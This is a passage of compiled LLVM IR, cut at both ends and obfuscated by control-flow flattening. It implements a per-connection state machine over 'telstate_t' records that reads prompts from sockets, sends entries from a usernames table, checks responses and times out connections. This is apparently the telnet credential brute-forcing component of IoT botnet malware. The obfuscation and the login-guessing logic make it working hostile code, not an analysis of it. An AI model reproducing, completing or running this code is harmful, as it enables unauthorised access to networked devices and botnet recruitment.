  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = load i32, i32* %2, align 4
  %480 = sext i32 %479 to i64
  %.reload332 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload332, i64 %480
  %482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %481, i32 0, i32 2
  store i8 3, i8* %482, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  %484 = load i32, i32* %2, align 4
  %485 = sext i32 %484 to i64
  %.reload331 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload331, i64 %485
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %486, i32 0, i32 0
  %488 = load i32, i32* %487, align 16
  %489 = load i32, i32* %2, align 4
  %490 = sext i32 %489 to i64
  %.reload330 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload330, i64 %490
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %491, i32 0, i32 8
  %493 = load i8*, i8** %492, align 8
  %494 = load i32, i32* %2, align 4
  %495 = sext i32 %494 to i64
  %.reload329 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload329, i64 %495
  %497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %496, i32 0, i32 7
  %498 = load i16, i16* %497, align 16
  %499 = zext i16 %498 to i32
  %500 = call i32 @readUntil(i32 %488, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %493, i32 1024, i32 %499)
  %501 = icmp ne i32 %500, 0
  %502 = select i1 %501, i32 -1449600179, i32 953921347
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %2, align 4
  %505 = sext i32 %504 to i64
  %.reload328 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload328, i64 %505
  %507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %506, i32 0, i32 6
  store i32 0, i32* %507, align 4
  %508 = load i32, i32* %2, align 4
  %509 = sext i32 %508 to i64
  %.reload327 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %510 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload327, i64 %509
  %511 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %510, i32 0, i32 7
  store i16 0, i16* %511, align 16
  %512 = load i32, i32* %2, align 4
  %513 = sext i32 %512 to i64
  %.reload326 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload326, i64 %513
  %515 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %514, i32 0, i32 8
  %516 = load i8*, i8** %515, align 8
  %517 = call i8* @strstr(i8* %516, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %518 = icmp ne i8* %517, null
  %519 = select i1 %518, i32 1123494408, i32 539861027
  store i32 %519, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i32, i32* %2, align 4
  %522 = sext i32 %521 to i64
  %.reload325 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %523 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload325, i64 %522
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %523, i32 0, i32 2
  store i8 5, i8* %524, align 8
  store i32 1824042668, i32* %switchVar
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %526 = load i32, i32* %2, align 4
  %527 = sext i32 %526 to i64
  %.reload324 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload324, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 8
  %530 = load i8*, i8** %529, align 8
  call void @llvm.memset.p0i8.i64(i8* %530, i8 0, i64 1024, i32 1, i1 false)
  store i32 1824042668, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  %532 = load i32, i32* %2, align 4
  %533 = sext i32 %532 to i64
  %.reload323 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload323, i64 %533
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %534, i32 0, i32 2
  store i8 3, i8* %535, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  %537 = load i32, i32* %2, align 4
  %538 = sext i32 %537 to i64
  %.reload322 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload322, i64 %538
  %540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %539, i32 0, i32 0
  %541 = load i32, i32* %540, align 16
  %542 = load i32, i32* %2, align 4
  %543 = sext i32 %542 to i64
  %.reload321 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload321, i64 %543
  %545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %544, i32 0, i32 8
  %546 = load i8*, i8** %545, align 8
  %547 = load i32, i32* %2, align 4
  %548 = sext i32 %547 to i64
  %.reload320 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload320, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 7
  %551 = load i16, i16* %550, align 16
  %552 = zext i16 %551 to i32
  %553 = call i32 @readUntil(i32 %541, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %546, i32 1024, i32 %552)
  %554 = icmp ne i32 %553, 0
  %555 = select i1 %554, i32 -1794702103, i32 2079499622
  store i32 %555, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load i32, i32* %2, align 4
  %558 = sext i32 %557 to i64
  %.reload319 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload319, i64 %558
  %560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %559, i32 0, i32 6
  store i32 0, i32* %560, align 4
  %561 = load i32, i32* %2, align 4
  %562 = sext i32 %561 to i64
  %.reload318 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload318, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 7
  store i16 0, i16* %564, align 16
  %565 = load i32, i32* %2, align 4
  %566 = sext i32 %565 to i64
  %.reload317 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload317, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 8
  %569 = load i8*, i8** %568, align 8
  %570 = call i8* @strstr(i8* %569, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %571 = icmp ne i8* %570, null
  %572 = select i1 %571, i32 -2007670604, i32 1749093153
  store i32 %572, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = load i32, i32* %2, align 4
  %575 = sext i32 %574 to i64
  %.reload316 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload316, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 2
  store i8 5, i8* %577, align 8
  store i32 -1141869986, i32* %switchVar
  br label %loopEnd

; <label>:578:                                    ; preds = %loopEntry
  %579 = load i32, i32* %2, align 4
  %580 = sext i32 %579 to i64
  %.reload315 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload315, i64 %580
  %582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %581, i32 0, i32 8
  %583 = load i8*, i8** %582, align 8
  call void @llvm.memset.p0i8.i64(i8* %583, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1141869986, i32* %switchVar
  br label %loopEnd

; <label>:584:                                    ; preds = %loopEntry
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %.reload314 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload314, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 2
  store i8 3, i8* %588, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i32, i32* %2, align 4
  %591 = sext i32 %590 to i64
  %.reload313 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload313, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 0
  %594 = load i32, i32* %593, align 16
  %595 = load i32, i32* %2, align 4
  %596 = sext i32 %595 to i64
  %.reload312 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload312, i64 %596
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %597, i32 0, i32 8
  %599 = load i8*, i8** %598, align 8
  %600 = load i32, i32* %2, align 4
  %601 = sext i32 %600 to i64
  %.reload311 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload311, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 7
  %604 = load i16, i16* %603, align 16
  %605 = zext i16 %604 to i32
  %606 = call i32 @readUntil(i32 %594, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %599, i32 1024, i32 %605)
  %607 = icmp ne i32 %606, 0
  %608 = select i1 %607, i32 1942363510, i32 -543145919
  store i32 %608, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  %610 = load i32, i32* %2, align 4
  %611 = sext i32 %610 to i64
  %.reload310 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %612 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload310, i64 %611
  %613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %612, i32 0, i32 6
  store i32 0, i32* %613, align 4
  %614 = load i32, i32* %2, align 4
  %615 = sext i32 %614 to i64
  %.reload309 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %616 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload309, i64 %615
  %617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %616, i32 0, i32 7
  store i16 0, i16* %617, align 16
  %618 = load i32, i32* %2, align 4
  %619 = sext i32 %618 to i64
  %.reload308 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %620 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload308, i64 %619
  %621 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %620, i32 0, i32 8
  %622 = load i8*, i8** %621, align 8
  %623 = call i8* @strstr(i8* %622, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %624 = icmp ne i8* %623, null
  %625 = select i1 %624, i32 -558813709, i32 -1375631850
  store i32 %625, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  %627 = load i32, i32* %2, align 4
  %628 = sext i32 %627 to i64
  %.reload307 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload307, i64 %628
  %630 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %629, i32 0, i32 2
  store i8 5, i8* %630, align 8
  store i32 -870869277, i32* %switchVar
  br label %loopEnd

; <label>:631:                                    ; preds = %loopEntry
  %632 = load i32, i32* %2, align 4
  %633 = sext i32 %632 to i64
  %.reload306 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %634 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload306, i64 %633
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %634, i32 0, i32 8
  %636 = load i8*, i8** %635, align 8
  call void @llvm.memset.p0i8.i64(i8* %636, i8 0, i64 1024, i32 1, i1 false)
  store i32 -870869277, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i32, i32* %2, align 4
  %639 = sext i32 %638 to i64
  %.reload305 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %640 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload305, i64 %639
  %641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %640, i32 0, i32 2
  store i8 3, i8* %641, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:642:                                    ; preds = %loopEntry
  %643 = load i32, i32* %2, align 4
  %644 = sext i32 %643 to i64
  %.reload304 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %645 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload304, i64 %644
  %646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %645, i32 0, i32 0
  %647 = load i32, i32* %646, align 16
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %.reload303 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload303, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 8
  %652 = load i8*, i8** %651, align 8
  %653 = load i32, i32* %2, align 4
  %654 = sext i32 %653 to i64
  %.reload302 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload302, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 7
  %657 = load i16, i16* %656, align 16
  %658 = zext i16 %657 to i32
  %659 = call i32 @readUntil(i32 %647, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %652, i32 1024, i32 %658)
  %660 = icmp ne i32 %659, 0
  %661 = select i1 %660, i32 394808286, i32 -812243129
  store i32 %661, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = load i32, i32* %2, align 4
  %664 = sext i32 %663 to i64
  %.reload301 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload301, i64 %664
  %666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %665, i32 0, i32 6
  store i32 0, i32* %666, align 4
  %667 = load i32, i32* %2, align 4
  %668 = sext i32 %667 to i64
  %.reload300 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload300, i64 %668
  %670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %669, i32 0, i32 7
  store i16 0, i16* %670, align 16
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %.reload299 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload299, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 8
  %675 = load i8*, i8** %674, align 8
  %676 = call i8* @strstr(i8* %675, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %677 = icmp ne i8* %676, null
  %678 = select i1 %677, i32 1537104222, i32 -1243359480
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  %680 = load i32, i32* %2, align 4
  %681 = sext i32 %680 to i64
  %.reload298 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %682 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload298, i64 %681
  %683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %682, i32 0, i32 2
  store i8 5, i8* %683, align 8
  store i32 1943864784, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  %685 = load i32, i32* %2, align 4
  %686 = sext i32 %685 to i64
  %.reload297 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload297, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 8
  %689 = load i8*, i8** %688, align 8
  call void @llvm.memset.p0i8.i64(i8* %689, i8 0, i64 1024, i32 1, i1 false)
  store i32 1943864784, i32* %switchVar
  br label %loopEnd

; <label>:690:                                    ; preds = %loopEntry
  %691 = load i32, i32* %2, align 4
  %692 = sext i32 %691 to i64
  %.reload296 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload296, i64 %692
  %694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %693, i32 0, i32 2
  store i8 3, i8* %694, align 8
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:695:                                    ; preds = %loopEntry
  %696 = load i32, i32* %2, align 4
  %697 = sext i32 %696 to i64
  %.reload295 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload295, i64 %697
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %698, i32 0, i32 8
  %700 = load i8*, i8** %699, align 8
  %701 = call i64 @strlen(i8* %700) #10
  %702 = trunc i64 %701 to i16
  %703 = load i32, i32* %2, align 4
  %704 = sext i32 %703 to i64
  %.reload294 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload294, i64 %704
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %705, i32 0, i32 7
  store i16 %702, i16* %706, align 16
  store i32 1207920682, i32* %switchVar
  br label %loopEnd

; <label>:707:                                    ; preds = %loopEntry
  store i32 -895782930, i32* %switchVar
  br label %loopEnd

; <label>:708:                                    ; preds = %loopEntry
  store i32 -1513404192, i32* %switchVar
  br label %loopEnd

; <label>:709:                                    ; preds = %loopEntry
  store i32 391608949, i32* %switchVar
  br label %loopEnd

; <label>:710:                                    ; preds = %loopEntry
  store i32 1505311165, i32* %switchVar
  br label %loopEnd

; <label>:711:                                    ; preds = %loopEntry
  %712 = load i32, i32* %2, align 4
  %713 = sext i32 %712 to i64
  %.reload293 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload293, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 6
  %716 = load i32, i32* %715, align 4
  %717 = add i32 %716, 10
  %718 = zext i32 %717 to i64
  %719 = call i64 @time(i64* null) #2
  %720 = icmp slt i64 %718, %719
  %721 = select i1 %720, i32 1237942326, i32 1171328696
  store i32 %721, i32* %switchVar
  br label %loopEnd

; <label>:722:                                    ; preds = %loopEntry
  %723 = load i32, i32* %2, align 4
  %724 = sext i32 %723 to i64
  %.reload292 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload292, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 16
  %728 = call i32 @sclose(i32 %727)
  %729 = load i32, i32* %2, align 4
  %730 = sext i32 %729 to i64
  %.reload291 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload291, i64 %730
  %732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %731, i32 0, i32 2
  store i8 0, i8* %732, align 8
  %733 = load i32, i32* %2, align 4
  %734 = sext i32 %733 to i64
  %.reload290 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload290, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 3
  store i8 1, i8* %736, align 1
  store i32 1171328696, i32* %switchVar
  br label %loopEnd

; <label>:737:                                    ; preds = %loopEntry
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:738:                                    ; preds = %loopEntry
  %739 = load i32, i32* %2, align 4
  %740 = sext i32 %739 to i64
  %.reload289 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload289, i64 %740
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %741, i32 0, i32 0
  %743 = load i32, i32* %742, align 16
  %744 = load i32, i32* %2, align 4
  %745 = sext i32 %744 to i64
  %.reload288 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %746 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload288, i64 %745
  %747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %746, i32 0, i32 4
  %748 = load i8, i8* %747, align 2
  %749 = zext i8 %748 to i64
  %750 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %749
  %751 = load i8*, i8** %750, align 8
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %.reload287 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload287, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 4
  %756 = load i8, i8* %755, align 2
  %757 = zext i8 %756 to i64
  %758 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %757
  %759 = load i8*, i8** %758, align 8
  %760 = call i64 @strlen(i8* %759) #10
  %761 = call i64 @send(i32 %743, i8* %751, i64 %760, i32 16384)
  %762 = icmp slt i64 %761, 0
  %763 = select i1 %762, i32 1418848442, i32 603433714
  store i32 %763, i32* %switchVar
  br label %loopEnd

; <label>:764:                                    ; preds = %loopEntry
  %765 = load i32, i32* %2, align 4
  %766 = sext i32 %765 to i64
  %.reload286 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload286, i64 %766
  %768 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %767, i32 0, i32 0
  %769 = load i32, i32* %768, align 16
  %770 = call i32 @sclose(i32 %769)
  %771 = load i32, i32* %2, align 4
  %772 = sext i32 %771 to i64
  %.reload285 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload285, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 2
  store i8 0, i8* %774, align 8
  %775 = load i32, i32* %2, align 4
  %776 = sext i32 %775 to i64
  %.reload284 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %777 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload284, i64 %776
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %777, i32 0, i32 3
  store i8 1, i8* %778, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:779:                                    ; preds = %loopEntry
  %780 = load i32, i32* %2, align 4
  %781 = sext i32 %780 to i64
  %.reload283 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %782 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload283, i64 %781
  %783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %782, i32 0, i32 0
  %784 = load i32, i32* %783, align 16
  %785 = call i64 @send(i32 %784, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %786 = icmp slt i64 %785, 0
  %787 = select i1 %786, i32 1099450342, i32 -538434550
  store i32 %787, i32* %switchVar
  br label %loopEnd

; <label>:788:                                    ; preds = %loopEntry
  %789 = load i32, i32* %2, align 4
  %790 = sext i32 %789 to i64
  %.reload282 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload282, i64 %790
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %791, i32 0, i32 0
  %793 = load i32, i32* %792, align 16
  %794 = call i32 @sclose(i32 %793)
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %.reload281 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload281, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 2
  store i8 0, i8* %798, align 8
  %799 = load i32, i32* %2, align 4
  %800 = sext i32 %799 to i64
  %.reload280 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload280, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 3
  store i8 1, i8* %802, align 1
  store i32 -824704005, i32* %switchVar
  br label %loopEnd

; <label>:803:                                    ; preds = %loopEntry
  %804 = load i32, i32* %2, align 4
  %805 = sext i32 %804 to i64
  %.reload279 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload279, i64 %805
  %807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %806, i32 0, i32 2
  store i8 4, i8* %807, align 8
  store i32 -1568167552, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %.reload278 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload278, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 6
  %813 = load i32, i32* %812, align 4
  %814 = icmp eq i32 %813, 0
  %815 = select i1 %814, i32 238313762, i32 2055168301
  store i32 %815, i32* %switchVar
  br label %loopEnd

; <label>:816:                                    ; preds = %loopEntry
  %817 = call i64 @time(i64* null) #2
  %818 = trunc i64 %817 to i32
  %819 = load i32, i32* %2, align 4
  %820 = sext i32 %819 to i64
  %.reload277 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload277, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 6
  store i32 %818, i32* %822, align 4
  store i32 2055168301, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = load i32, i32* %2, align 4
  %825 = sext i32 %824 to i64
  %.reload276 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload276, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 0
  %828 = load i32, i32* %827, align 16
  %829 = load i32, i32* %2, align 4
  %830 = sext i32 %829 to i64
  %.reload275 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload275, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 8
  %833 = load i8*, i8** %832, align 8
  %834 = load i32, i32* %2, align 4
  %835 = sext i32 %834 to i64
  %.reload274 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem22
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload274, i64 %835
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %836, i32 0, i32 7
